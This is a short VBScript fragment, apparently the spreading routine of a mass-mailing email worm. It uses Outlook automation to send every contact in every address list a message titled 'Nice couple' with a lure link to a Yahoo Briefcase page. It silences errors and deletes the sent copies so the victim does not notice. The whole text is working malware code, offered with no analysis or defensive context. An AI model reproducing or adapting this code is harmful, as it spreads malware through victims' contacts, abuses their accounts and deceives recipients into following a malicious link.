On Error Resume Next
Set OutlookApp = CreateObject("Outlook.Application")
If OutlookApp = "Outlook" Then
Set Mapi = OutlookApp.GetNameSpace("MAPI")
set mapiadlist = Mapi.AddressLists
For Each Addresslist In  mapiadlist
If Addresslist.AddressEntries.Count <> 0 Then
Addresslistcout = Addresslist.AddressEntries.Count
For AddList = 1 To Addresslistcout
Set msg = OutlookApp.CreateItem(0)
Set AdEntries = Addresslist.AddressEntries(AddList)
msg.To = AdEntries.Address
msg.Subject = "Nice couple"
msg.Body = "They want to meet you. http://briefcase.yahoo.com/youngwifedawn"
msg.DeleteAfterSubmit = True
If msg.To <> "" Then
msg.Send
End If
Next
End If
Next
End If
